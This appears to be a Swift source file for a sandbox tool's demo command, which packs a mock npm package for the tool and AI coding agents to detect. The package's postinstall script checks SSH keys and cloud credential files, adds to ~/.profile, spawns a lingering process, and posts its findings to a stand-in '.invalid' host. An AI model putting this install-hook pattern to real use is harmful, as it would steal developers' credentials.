import Foundation
import LabBoxCore

// `labbox demo`: a sandbox set up for showing LabBox to people.
//
// The demo package behaves like a credential-stealing npm package so LabBox
// has something to catch, but it is written to be harmless even if it were
// run outside a sandbox: it reports only the names and sizes of the files it
// finds, never their contents, and it sends them to a host under ".invalid",
// a name that can never resolve. It says what it is in its README and in
// the comments of its install script.

enum DemoPackage {
    static let sandbox = "demo"
    static let tarball = "quickpdf-render-demo-1.0.0.tgz"

    static let files: [String: String] = [
        "package.json": """
        {
          "name": "quickpdf-render-demo",
          "version": "1.0.0",
          "description": "Fast HTML to PDF rendering for Node. LabBox demo package: see README.md.",
          "main": "index.js",
          "scripts": { "postinstall": "node setup.js" },
          "license": "MIT"
        }

        """,
        "index.js": """
        // quickpdf-render-demo: a LabBox demo package. See README.md.
        module.exports = function render(html) {
          const text = String(html).replace(/<[^>]*>/g, '');
          return Buffer.from('%PDF-1.4\\n% quickpdf demo\\n' + text + '\\n%%EOF\\n');
        };

        """,
        "setup.js": """
        // LabBox demo package.
        //
        // This install script imitates a credential-stealing npm package so that
        // LabBox has something to catch. It is harmless even outside a sandbox:
        // it sends only the names and sizes of the files it finds, never their
        // contents, to a ".invalid" host, which can never resolve.
        const fs = require('fs');
        const os = require('os');
        const https = require('https');
        const { spawn } = require('child_process');

        console.log('quickpdf: preparing font cache...');

        const found = {};
        for (const f of ['.ssh/id_rsa', '.ssh/id_ed25519', '.aws/credentials', '.npmrc', '.git-credentials']) {
          try { found[f] = fs.readFileSync(os.homedir() + '/' + f).length; } catch (e) {}
        }

        // Things that outlive the install, the way a real implant would.
        fs.appendFileSync(os.homedir() + '/.profile', '\\n# quickpdf font cache (LabBox demo)\\n');
        spawn('sleep', ['600'], { detached: true, stdio: 'ignore' }).unref();

        const req = https.request('https://telemetry.quickpdf-demo.invalid/v1/fonts',
          { method: 'POST', timeout: 5000 }, () => {});
        req.on('error', () => {});
        req.on('timeout', () => req.destroy());
        req.end(JSON.stringify({ found }));

        """,
        "README.md": """
        # quickpdf-render-demo

        A demo package for LabBox. Its install script acts like a
        credential-stealing package: it reads key files, adds a line to
        `~/.profile`, leaves a process running and tries to post to a server.

        It is harmless on purpose. It sends only file names and sizes, never
        contents, to a `.invalid` host that cannot resolve. Inside LabBox the
        keys it reads are decoys and the upload is blocked.

        """,
    ]

    /// The package as a gzip'd tar, base64 encoded, ready to pass into the VM.
    static func packedSource() throws -> String {
        let fm = FileManager.default
        let dir = fm.temporaryDirectory.appendingPathComponent("labbox-demo-\(UUID().uuidString)")
        let src = dir.appendingPathComponent("src")
        try fm.createDirectory(at: src, withIntermediateDirectories: true)
        defer { try? fm.removeItem(at: dir) }
        for (name, text) in files {
            try Data(text.utf8).write(to: src.appendingPathComponent(name))
        }
        let out = dir.appendingPathComponent("src.tgz")
        let tar = Process()
        tar.executableURL = URL(fileURLWithPath: "/usr/bin/tar")
        tar.arguments = ["-czf", out.path, "-C", src.path, "."]
        tar.environment = ["COPYFILE_DISABLE": "1"]
        try tar.run()
        tar.waitUntilExit()
        guard tar.terminationStatus == 0 else { throw SandboxStore.Problem.io("tar failed packing the demo package") }
        return try Data(contentsOf: out).base64EncodedString()
    }

    static let prompts = """

    The demo sandbox is ready. Open Claude Code in Ghostty (so the live pane
    can open beside it) and try these two prompts:

      1. A colleague sent me \(tarball) for PDF export. It's in /work in the
         LabBox sandbox "demo". Try installing it into /work/app there and
         tell me whether it's OK to use.

      2. Now do the same check for the npm package is-number.

    Before the next showing, run `labbox demo` again to put the sandbox back.
    The demo package's source is in Sources/labbox/Demo.swift.
    """
}

/// Runs this binary with the terminal attached, so the user sees progress.
func runSelfAttached(_ arguments: [String]) -> Int32 {
    guard let me = Bundle.main.executableURL else { return 125 }
    let process = Process()
    process.executableURL = me
    process.arguments = arguments
    guard (try? process.run()) != nil else { return 125 }
    process.waitUntilExit()
    return process.terminationStatus
}

func demo(_ args: [String]) -> Never {
    var rest = args
    let rebuild = takeFlag("--rebuild", from: &rest)
    guard rest.isEmpty else { fail("usage: labbox demo [--rebuild]") }
    let store = SandboxStore()
    let name = DemoPackage.sandbox

    if let info = try? store.info(name), !rebuild {
        guard info.snapshots.contains("ready") else {
            fail("sandbox '\(name)' exists but has no 'ready' snapshot, so it may be half set up.\nRun: labbox demo --rebuild", code: 1)
        }
        attempt { try store.restore(name, from: "ready") }
        print("Demo sandbox put back to its starting state.")
        print(DemoPackage.prompts)
        exit(0)
    }

    if rebuild, (try? store.info(name)) != nil {
        attempt { try store.delete(name) }
        print("Removed the old demo sandbox.")
        fflush(stdout)
    }
    _ = attempt { try store.create(name) }
    let packed = attempt { try DemoPackage.packedSource() }
    print("Setting up the demo sandbox: Node and npm from Alpine, then the demo package (about 10 s)...")
    fflush(stdout)

    let script = [
        "apk add --no-progress nodejs npm >/dev/null 2>&1",
        "mkdir -p /tmp/src /work/app",
        "echo \(packed) | base64 -d | tar -xzf - -C /tmp/src",
        "cd /tmp/src && npm pack --silent --pack-destination /work >/dev/null",
        "cd /work/app && npm init -y >/dev/null",
        "echo 'node' $(node --version) '/ npm' $(npm --version)",
        "ls /work",
    ].joined(separator: " && ")
    let status = runSelfAttached(["run", "--in", name, "--timeout", "300", "--allow", "dl-cdn.alpinelinux.org",
                                  "--", "sh", "-c", script])
    guard status == 0 else {
        fail("demo setup failed (exit \(status)). Run: labbox demo --rebuild", code: 1)
    }
    attempt { try store.snapshot(name, as: "ready") }
    print(DemoPackage.prompts)
    exit(0)
}
